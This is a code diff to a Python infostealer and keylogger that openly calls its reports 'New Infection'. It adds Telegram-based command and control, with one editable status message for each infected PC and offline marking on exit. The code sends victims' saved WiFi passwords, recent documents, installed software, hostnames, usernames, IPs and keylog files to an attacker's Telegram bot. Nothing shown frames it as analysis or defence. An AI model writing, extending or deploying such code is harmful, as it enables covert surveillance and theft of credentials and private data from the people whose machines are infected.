@@ -206,12 +206,15 @@ def _hide_from_taskmanager() -> bool:
         return False
 
 # ============================================================================
-# TELEGRAM INTEGRATION
+# TELEGRAM INTEGRATION - Multi-PC tracking with editable status messages
 # ============================================================================
+
+_PC_ID = f"{socket.gethostname()}_{os.environ.get('USERNAME', 'unknown')}"
+_TELEGRAM_STATE_FILE = os.path.join(KEYLOG_DIR, ".tg_state.json")
 
 def _send_telegram(text: str, parse_mode: str = "HTML") -> bool:
     """Send message to Telegram bot."""
-    if TELEGRAM_BOT_TOKEN == "YOUR_TELEGRAM_BOT_TOKEN_HERE" or not TELEGRAM_CHAT_ID:
+    if not TELEGRAM_BOT_TOKEN or TELEGRAM_BOT_TOKEN.startswith("BUILD_") or not TELEGRAM_CHAT_ID:
         return False
     try:
         url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
@@ -221,9 +224,35 @@ def _send_telegram(text: str, parse_mode: str = "HTML") -> bool:
     except:
         return False
 
+def _send_telegram_get_id(text: str, parse_mode: str = "HTML") -> Optional[str]:
+    """Send message and return message_id for future edits."""
+    if not TELEGRAM_BOT_TOKEN or TELEGRAM_BOT_TOKEN.startswith("BUILD_") or not TELEGRAM_CHAT_ID:
+        return None
+    try:
+        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+        payload = {"chat_id": TELEGRAM_CHAT_ID, "text": text, "parse_mode": parse_mode}
+        resp = requests.post(url, json=payload, timeout=15)
+        if resp.status_code == 200:
+            return str(resp.json().get("result", {}).get("message_id", ""))
+        return None
+    except:
+        return None
+
+def _edit_telegram(message_id: str, text: str, parse_mode: str = "HTML") -> bool:
+    """Edit an existing Telegram message by message_id."""
+    if not TELEGRAM_BOT_TOKEN or TELEGRAM_BOT_TOKEN.startswith("BUILD_") or not TELEGRAM_CHAT_ID:
+        return False
+    try:
+        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/editMessageText"
+        payload = {"chat_id": TELEGRAM_CHAT_ID, "message_id": message_id, "text": text, "parse_mode": parse_mode}
+        resp = requests.post(url, json=payload, timeout=15)
+        return resp.status_code == 200
+    except:
+        return False
+
 def _send_telegram_file(file_path: str, caption: str = "") -> bool:
     """Send file to Telegram bot."""
-    if TELEGRAM_BOT_TOKEN == "YOUR_TELEGRAM_BOT_TOKEN_HERE" or not TELEGRAM_CHAT_ID:
+    if not TELEGRAM_BOT_TOKEN or TELEGRAM_BOT_TOKEN.startswith("BUILD_") or not TELEGRAM_CHAT_ID:
         return False
     try:
         url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
@@ -234,59 +263,129 @@ def _send_telegram_file(file_path: str, caption: str = "") -> bool:
     except:
         return False
 
-def _send_telegram_full_report(cloudflared_url: str) -> bool:
-    """Send comprehensive system report to Telegram on startup."""
+def _load_telegram_state() -> dict:
+    """Load Telegram message state from local file."""
     try:
-        hostname = socket.gethostname()
-        host_ip = "Unknown"
-        try:
-            local_ips = socket.gethostbyname_ex(hostname)[2]
-            for ip in local_ips:
-                if not ip.startswith('127.') and not ip.startswith('169.254.'):
-                    host_ip = ip
-                    break
-        except:
-            pass
+        if os.path.exists(_TELEGRAM_STATE_FILE):
+            with open(_TELEGRAM_STATE_FILE, 'r', encoding='utf-8') as f:
+                return json.load(f)
+    except:
+        pass
+    return {}
 
-        import platform as _pf
-        os_info = f"{_pf.system()} {_pf.release()} ({_pf.version()})"
-        machine = _pf.machine()
-        processor = _pf.processor() or "Unknown"
+def _save_telegram_state(state: dict):
+    """Save Telegram message state to local file."""
+    try:
+        with open(_TELEGRAM_STATE_FILE, 'w', encoding='utf-8') as f:
+            json.dump(state, f)
+    except:
+        pass
 
-        wifi_pwds = _dump_wifi_passwords()
-        wifi_text = "\n".join(wifi_pwds[:10]) if wifi_pwds else "None found"
+def _build_pc_status_text(cloudflared_url: str, status: str = "🟢 Active") -> str:
+    """Build the status message text for this PC."""
+    hostname = socket.gethostname()
+    username = os.environ.get('USERNAME', 'Unknown')
+    host_ip = "Unknown"
+    try:
+        local_ips = socket.gethostbyname_ex(hostname)[2]
+        for ip in local_ips:
+            if not ip.startswith('127.') and not ip.startswith('169.254.'):
+                host_ip = ip
+                break
+    except:
+        pass
 
-        recent = _get_recent_documents()
-        recent_text = "\n".join(recent[:10]) if recent else "None found"
+    import platform as _pf
+    os_info = f"{_pf.system()} {_pf.release()}"
+    now_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
-        installed = _get_installed_software()
-        installed_text = "\n".join(installed[:15]) if installed else "None found"
+    wifi_pwds = _dump_wifi_passwords()
+    wifi_text = "\n".join(wifi_pwds[:8]) if wifi_pwds else "None found"
 
-        msg = f"""<b>🟢 IGR - New Infection</b>
+    recent = _get_recent_documents()
+    recent_text = "\n".join(recent[:8]) if recent else "None found"
 
-<b>Network:</b>
-  Host: {hostname}
-  IP: {host_ip}
-  URL: {cloudflared_url}
+    installed = _get_installed_software()
+    installed_text = "\n".join(installed[:10]) if installed else "None found"
 
-<b>System:</b>
-  OS: {os_info}
-  Arch: {machine}
-  CPU: {processor}
-  User: {os.environ.get('USERNAME', 'Unknown')}
+    return f"""<b>{status} | {hostname}</b>
+
+<b>User:</b> {username} | <b>IP:</b> {host_ip}
+<b>OS:</b> {os_info}
+<b>Dashboard:</b> {cloudflared_url or 'N/A'}
+<b>Last Seen:</b> {now_str}
 
 <b>WiFi Passwords:</b>
 <pre>{wifi_text}</pre>
 
-<b>Recent Documents:</b>
+<b>Recent Docs:</b>
 <pre>{recent_text}</pre>
 
-<b>Installed Software:</b>
+<b>Software:</b>
 <pre>{installed_text}</pre>"""
 
-        return _send_telegram(msg)
+def _send_telegram_full_report(cloudflared_url: str) -> bool:
+    """Send or update PC status message on Telegram. One message per PC, edited on reconnect."""
+    try:
+        state = _load_telegram_state()
+        msg_text = _build_pc_status_text(cloudflared_url, "🟢 Active")
+        pc_msg_id = state.get(_PC_ID, {}).get("message_id", "")
+
+        if pc_msg_id:
+            edited = _edit_telegram(pc_msg_id, msg_text)
+            if edited:
+                state[_PC_ID]["last_seen"] = datetime.now().isoformat()
+                state[_PC_ID]["status"] = "active"
+                _save_telegram_state(state)
+                _send_keylog_to_telegram()
+                return True
+
+        msg_id = _send_telegram_get_id(msg_text)
+        if msg_id:
+            state[_PC_ID] = {
+                "message_id": msg_id,
+                "status": "active",
+                "last_seen": datetime.now().isoformat()
+            }
+            _save_telegram_state(state)
+            _send_keylog_to_telegram()
+            return True
+
+        return _send_telegram(msg_text)
     except:
         return False
+
+def _send_keylog_to_telegram():
+    """Send the last session's keylog file to Telegram."""
+    try:
+        if os.path.exists(KEYLOG_FILE) and os.path.getsize(KEYLOG_FILE) > 0:
+            hostname = socket.gethostname()
+            _send_telegram_file(KEYLOG_FILE, caption=f"📋 Keylogs from {hostname}")
+    except:
+        pass
+
+def _telegram_mark_offline():
+    """Edit the PC's Telegram status message to show offline."""
+    try:
+        state = _load_telegram_state()
+        pc_data = state.get(_PC_ID, {})
+        msg_id = pc_data.get("message_id", "")
+        if not msg_id:
+            return
+        now_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        offline_text = f"""<b>🔴 Offline | {socket.gethostname()}</b>
+
+<b>User:</b> {os.environ.get('USERNAME', 'Unknown')}
+<b>Last Seen:</b> {now_str}"""
+        _edit_telegram(msg_id, offline_text)
+        state[_PC_ID]["status"] = "offline"
+        state[_PC_ID]["last_seen"] = datetime.now().isoformat()
+        _save_telegram_state(state)
+    except:
+        pass
+
+import atexit
+atexit.register(_telegram_mark_offline)
 
 # ============================================================================
 # DATA HARVESTING FUNCTIONS
